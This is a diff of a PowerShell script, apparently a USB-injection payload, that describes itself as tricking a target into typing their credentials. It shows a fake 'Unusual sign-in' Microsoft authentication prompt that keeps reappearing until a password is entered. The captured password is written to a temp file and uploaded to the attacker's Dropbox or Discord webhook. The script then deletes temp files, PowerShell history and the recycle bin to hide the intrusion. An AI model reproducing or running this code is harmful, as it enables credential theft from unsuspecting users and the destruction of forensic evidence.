@@ -19,16 +19,16 @@
 
 <#
 .SYNOPSIS
-	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
+    This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
 
 .DESCRIPTION 
-	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
-	This will be followed by a fake authentication ui prompt. 
-	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
-	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
+    A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
+    This will be followed by a fake authentication ui prompt. 
+    If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
+    Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection
 
 .Link
-	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
+    https://developers.dropbox.com/oauth-guide      # Guide for setting up your DropBox for uploads
 
 #>
 
@@ -42,13 +42,13 @@
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
- 
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 <#
 
 .NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
+    This is to generate the ui.prompt you will use to harvest their credentials
 #>
 
 function Get-Creds {
@@ -57,7 +57,7 @@ function Get-Creds {
 
     while ($form -eq $null)
     {
-        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred = $host.ui.promptforcredential('Failed Authentication','hey hey hey',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
         $cred.getnetworkcredential().password
 
         if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
@@ -88,7 +88,7 @@ function Get-Creds {
 <#
 
 .NOTES 
-	This is to pause the script until a mouse movement is detected
+    This is to pause the script until a mouse movement is detected
 #>
 
 function Pause-Script{
@@ -127,7 +127,7 @@ $key.SendKeys('{CapsLock}')
 <#
 
 .NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+    This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
 #>
 
 Pause-Script
@@ -149,7 +149,7 @@ $creds = Get-Creds
 <#
 
 .NOTES 
-	This is to save the gathered credentials to a file in the temp directory
+    This is to save the gathered credentials to a file in the temp directory
 #>
 
 echo $creds >> $env:TMP\$FileName
@@ -159,14 +159,14 @@ echo $creds >> $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to upload your files to dropbox
+    This is to upload your files to dropbox
 #>
 
 function DropBox-Upload {
 
 [CmdletBinding()]
 param (
-	
+    
 [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
 [Alias("f")]
 [string]$SourceFilePath
@@ -216,7 +216,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName
 <#
 
 .NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
+    This is to clean up behind you and remove any evidence to prove you were there
 #>
 
 # Delete contents of Temp folder 
@@ -236,4 +236,3 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 exit
-
